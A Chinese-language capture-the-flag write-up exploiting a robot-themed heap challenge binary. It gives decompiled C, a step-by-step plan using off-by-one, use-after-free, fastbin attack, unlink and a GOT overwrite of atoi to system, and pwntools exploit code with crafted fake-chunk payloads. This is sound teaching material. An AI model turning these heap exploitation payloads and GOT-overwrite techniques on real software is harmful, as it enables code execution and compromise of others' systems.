
```c
ssize_t sub_4013E0() {
    ssize_t result;
    // rax
    sub_400D83("Which robot's name do you want to change?");
    printf("Your choice :");
    memset(&unk_603110, 0, 4uLL);
    result = (unsigned int)sub_400A36(&unk_603110, 4uLL);
    switch ( (int)result ) {
    case 1:
        result = (unsigned int)dword_603120;
        if ( dword_603120 ) {
            puts("Robot's name: ");
            result = read(0, buf, 0x14uLL);
        }
        break;
    case 2:
        result = (unsigned int)dword_603114;
        if ( dword_603114 ) {
            puts("Robot's name: ");
            result = read(0, qword_6030F0, 20 * qword_603138);
        }
        break;
    case 3:
        result = (unsigned int)dword_603124;
        if ( dword_603124 ) {
            puts("Robot's name: ");
            result = read(0, qword_603100, 20 * qword_603140);
        }
        break;
    case 4:
        result = (unsigned int)dword_603118;
        if ( dword_603118 ) {
            puts("Robot's name: ");
            result = read(0, qword_6030E0, 0xFA0uLL);
        }
        break;
    case 5:
        result = (unsigned int)dword_603128;
        if ( dword_603128 ) {
            puts("Robot's name: ");
            result = read(0, qword_603108, 0x9C40uLL);
        }
        break;
    case 6:
        result = (unsigned int)dword_60311C;
        if ( dword_60311C ) {
            puts("Robot's name: ");
            result = read(0, qword_6030E8, 20 * qword_603148);
        }
        break;
    default:
        return result;
    }
    return result;
}
```

看功能四，其实就是打印内存内容，但是我们不能控制要打印哪个内存，因为 `switch` 传入的值是随机的。

```c
unsigned __int64 __fastcall sub_4015BD(__int64 a1) {
    unsigned __int64 v2;
    // [rsp+38h] [rbp-8h]
    do
        v2 = rand();
    while ( 0x80000000 - 0x80000000uLL % (a1 + 1) <= v2 );
    return v2 / (0x80000000uLL / (a1 + 1));
}
int sub_40162E() {
    if ( (unsigned __int64)qword_603130 > 2 ) {
        switch ( (unsigned int)sub_4015BD(6LL) ) {
        case 1u:
            if ( !dword_603114 ) goto LABEL_6;
            sub_400CA0(buf);
            break;
        case 2u:
        LABEL_6:
            if ( !dword_603114 ) goto LABEL_8;
            sub_400B20("Are you kidding me!!!");
            break;
        case 3u:
        LABEL_8:
            if ( !dword_603124 ) goto LABEL_10;
            sub_400CA0(qword_603100);
            break;
        case 4u:
        LABEL_10:
            if ( !dword_603118 ) goto LABEL_12;
            sub_400CA0(qword_6030E0);
            break;
        case 5u:
        LABEL_12:
            if ( !dword_603128 ) goto LABEL_14;
            sub_400CA0(qword_603108);
            break;
        case 6u:
        LABEL_14:
            if ( !dword_60311C ) goto LABEL_16;
            sub_400CA0(qword_6030E8);
            break;
        default:
        LABEL_16:
            sub_400BE5(" AH AH AH Welcome in Robot Hell!! ");
            break;
        }
        exit(1);
    }
    return puts("Filling the wheel first!");
}
```

## 思路

1. 利用 `off by one` 漏洞和 `use after free` 和 `fastbin attack` 分配 `chunk` 到 `0x603138`（`0x603148` 记录了 `case6` 机器人的可写入长度），进而可以控制 `size` 的大小，从而实现任意长度堆溢出。这里我们将 `case2` 机器人 `Bender` 分配到这里

2. 分别分配合适大小的物理相邻的 `chunk`，其中包括 `case6`。借助上面可以任意长度堆溢出的漏洞，对 `case6` 对应的 `chunk` 进行溢出，将其溢出到下一个物理相邻的 `chunk`，从而实现对 `0x6030E8` 处 `fake chunk` 进行 `unlink` 的效果，这时 `bss` 段的 `case6` 指向 `0x6030D0`。从而，我们可以再次实现覆盖 `bss` 段几乎所有的内容。

3. 构造一个任意地址写的漏洞。通过上述的漏洞将 `case6` 覆盖为 `free@got`，`case2` 覆盖为 `case6` 申请记录变量的地址，这样就能无限 `free` `case6` 了，`case1` 指针覆盖为 `case6` 的地址，那么此后编辑 `case1` 即在编辑 `case6` 的内容，进而当我们再次编辑 `case6` 时就相当于任意地址写。

4. 通过步骤四我们覆盖了 `case6` 为 `free@got`，我们编辑 `case6` 的内容，就能够将 `free@got` 内容修改为 `puts@plt`，接着我们编辑 `case2` 为 `puts@got`，此时调用 `free(case6)` 其实就是 `puts(puts@got)` 泄露地址。

5. 在泄漏了相应的内容后，我们便可以得到 `libc` 基地址，`system` 地址。我们只要编辑 `case1` 为 `atoi@got`，编辑 `case2` 为 `1`，再 `free(case6)` 就能够修改 `atoi@got` 为 `system` 地址。这样当我们输入 `"sh"` 时，`atoi("sh")` 就变成了 `system("sh")`，执行 `shell`。

感觉有点烧脑。。。看 `wp` 理解了好久

## 分析过程

```python
def add(choice,size=0):
    io.recvuntil(b"Your choice : ")
    io.send(b'1')
    io.recvuntil(b"Your choice :")
    io.send(str(choice).encode())
    if choice == 2:
        io.recvuntil(b"Increase Bender's intelligence: ")
        io.send(str(size).encode())
    elif choice == 3:
        io.recvuntil(b"Increase Robot Devil's cruelty: ")
        io.send(str(size).encode())
    elif choice == 6:
        io.recvuntil(b"Increase Destructor's powerful: ")
        io.send(str(size).encode())
def off_by_one(choice):
    io.recvuntil(b"Your choice : ")
    io.send(b'1')
    io.recvuntil(b"Your choice :")
    io.send(str(choice).encode())
def delete(choice):
    io.recvuntil(b"Your choice : ")
    io.send(b'2')
    io.recvuntil(b"Your choice :")
    io.send(str(choice).encode())
def change(choice,payload):
    io.recvuntil(b"Your choice : ")
    io.send(b'3')
    io.recvuntil(b"Your choice :")
    io.send(str(choice).encode())
    io.recvuntil(b"Robot's name: \n")
    io.send(payload)
def start(index):
    io.recvuntil(b"Your choice : ")
    io.send(b'4')
```

先写下程序的交互

```python
# case6 即 Destructor 的指针，指向分配的内存
ptr = 0x6030E8
# case1 的指针，指向分配的内存
buf = 0x6030F8
# pause()
# 坑1
add(2,1)  # 申请 case2，size 是 20*1，这里好坑，calloc(1,20) 分配给我们的 chunk_size 是 0x20 而不是 0x30，因为这里复用了下一块 chunk 的 pre_size 部分
delete(2) # 回收 case2，申请记录就变成 0 了，回收到 fastbin，fastbin -> chunk0 -> null
```

首先申请 `case2`，然后再回收，此时申请记录为 `0`

```python
off_by_one('9999'+'\x01') # 利用 off_by_one 漏洞，把 case2 的申请记录从 0 改成 1，改了才能编辑 case2 内容
change(2,p64(0x603138)) # 这里利用了 use after free，修改 chunk0 的 fd 指针，变成 fastbin -> chunk0 -> 0x603138 -> null
```

通过 `off by one` 漏洞溢出 `0x603114` 最低字节，并修改 `fd` 指针

```python
off_by_one('9999'+'\x00') # 利用 off_by_one 漏洞，把 case2 的申请记录从 1 改成 0，改了才能添加 case2
add(1) # fastbin -> 0x603138 -> null
add(3,0x20) # 我们还需要把 0x603140 改成 0x20，为的是绕过 size 的检查，这个地址对应 case3 的 size
add(2,1) # 分配 0x603138 的 chunk 给 case2，就能够修改 case6 的写入长度了
```

把 `0x603148` 地址作为内存分配给 `case2`

```python
delete(1) # 回收 case1
delete(3) # 回收 case3 因为不能超过三个机器人
add(6,8) # 申请 case6，对应 0x6030E8 地址，20*8=0xa0，分配了 0xb0 的 chunk，记 chunk1
add(3,8) # 申请 case3，分配了 0xb0 的 chunk，记 chunk2
```

回收 `case1` 和 `case3`，申请 `case6` 和 `case3`

```python
change(2,p64(1000)) # 修改写入长度造成堆溢出
payload = p64(0)+p64(0x20) # fake chunk 的 presize 和 size
# FD->bk != P || BK->fd != P;fd 和 bk 的设置是为了绕过这个检查
payload += p64(ptr - 0x18) # fake chunk 的 fd，即 &case6-0x18
payload += p64(ptr - 0x10) # fake chunk 的 bk，即 &case6-0x10
payload += p64(0x20) # 这里是为了绕过 chunksize(P) != prev_size (next_chunk(P)) 这个检查
payload = payload.ljust(0xa0,b'a')
payload += p64(0xa0) # chunk2 的 presize
payload += p64(0xb0) # chunk2 的 size，这里主要把 inuse 标志位改成 0，这样 free 时就能触发 unlink
change(6,payload) # 这里利用堆溢出修改 chunk1 和 chunk2，布置利用环境
delete(3) # 触发 unlink
```

编辑 `case2` 修改 `case6` 的写入长度，接着就是布置 `unlink` 环境
